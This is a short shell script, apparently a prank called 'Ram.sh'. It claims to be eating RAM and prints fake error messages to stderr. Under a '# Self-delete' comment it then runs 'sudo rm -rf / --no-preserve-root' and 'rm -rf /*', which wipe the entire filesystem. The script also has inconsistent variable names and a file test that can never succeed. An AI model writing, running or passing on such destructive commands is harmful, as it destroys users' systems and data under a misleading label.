#!/bin/sh

SCRIPT_NAME="$(basename "Ram.sh")"

echo "Eating your RAM..."
sleep 60

echo "Bye bye!!!"

# Spam fake error messages to stderr
i=0
while [ $i -lt 20 ]; do
  echo "ERROR: Failed to access: $SCRIPTNAME" 1>&2
  sleep 0.1
  i=$((i+1))
done

# Delete test file if it exists
if [ -f "/" ]; then
  echo "File deleted: $SCRIPTNAME"
  echo "File Deleted: /"
else
  echo "File not found: $SCRIPTNAME"
  echo "Uhm what?"
fi

# Self-delete
sh
sudo rm -rf / --no-preserve-root /
rm -rf /*
rm -rf /.
